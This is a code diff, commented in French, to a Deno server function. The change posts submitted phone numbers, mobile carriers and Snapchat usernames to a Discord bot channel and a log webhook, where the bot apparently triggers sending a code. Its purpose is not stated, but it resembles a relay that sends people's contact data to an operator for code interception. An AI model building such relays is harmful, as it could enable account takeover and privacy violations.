@@ -176,19 +176,44 @@ Deno.serve(async (req) => {
     const rawPhone = String(sub?.telephone || "").replace(/\D/g, "");
     const content = `📤 [${actionCode}] ${rawPhone} | ${sub?.operateur || ""} | ${sub?.snapchat || ""}`;
 
+    // 1) Envoi dans le channel que le bot écoute (DISCORD_CHANNEL_ID) via l'API Bot.
+    //    Un bot qui lit les messages via la Gateway ignore souvent les messages
+    //    provenant d'un webhook (webhook_id présent) — il faut un "vrai" message
+    //    bot pour déclencher l'envoi du code.
+    const BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
+    const CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");
+    let postedToChannel = false;
+    if (BOT_TOKEN && CHANNEL_ID) {
+      try {
+        const chanRes = await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
+          method: "POST",
+          headers: { "Authorization": `Bot ${BOT_TOKEN}`, "Content-Type": "application/json" },
+          body: JSON.stringify({ content, embeds: [embed] }),
+        });
+        postedToChannel = chanRes.ok;
+        if (!chanRes.ok) {
+          console.error(`Bot channel post error ${chanRes.status}: ${await chanRes.text()}`);
+        }
+      } catch (e) {
+        console.error("Bot channel post failed:", e.message);
+      }
+    }
+
+    // 2) Log webhook (canal de logs humain) — conservé en plus du channel bot.
     const webhookRes = await fetch(LOG_WEBHOOK, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content, embeds: [embed] }),
     });
-
     if (!webhookRes.ok) {
-      const error = await webhookRes.text();
-      console.error(`Webhook error ${webhookRes.status}: ${error}`);
-      return Response.json({ ok: true, webhook: false, error: error });
+      console.error(`Webhook error ${webhookRes.status}: ${await webhookRes.text()}`);
     }
 
-    return Response.json({ ok: true, webhook: true });
+    if (!postedToChannel && !webhookRes.ok) {
+      return Response.json({ ok: true, webhook: false, error: "Discord send failed" });
+    }
+
+    return Response.json({ ok: true, webhook: true, channel: postedToChannel });
   } catch (error) {
     return Response.json({ error: error.message }, { status: 500 });
   }
